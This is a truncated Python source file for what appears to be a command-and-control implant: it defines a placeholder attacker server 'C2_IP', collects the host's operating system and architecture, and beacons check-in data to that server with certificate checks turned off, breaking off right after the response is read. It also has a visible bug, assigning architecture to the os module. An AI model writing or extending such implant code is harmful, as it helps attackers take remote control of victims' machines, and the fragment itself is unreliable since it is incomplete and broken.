import requests 
import base64
import time
import logging
import subprocess
import os
import platform

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s') 
c2_server = "http://C2_IP"

def find_os():
    '''
    Function to retrieve system OS information 
    '''
    os_info = {
        "type": None, 
        "arch": None,
        "timestamp": time.time()
    }

    system = platform.system().lower()
    if "linux" in system:
        os_info['type'] = 'linux'
    elif "windows" in system:
        os_info['type'] = 'windows'
    else:
        os_info['type'] = 'unknown'

    os['arch'] = platform.machine() 

    return os_info

def check_in(stg, ops):
    '''
    Function to check in with the server and verify operation status
    '''

    data = {
        'id': 1, 
        'stg': stg,
        'ops': ops
    }

    try:
        resp = requests.post(f"{c2_server}/c2", json=data, verify=False, timeout=10)
        # verify = false since it is a testing environment - shd be set to true if deployed in prod

        if resp.status_code == 200 :
            data = resp.json()




        





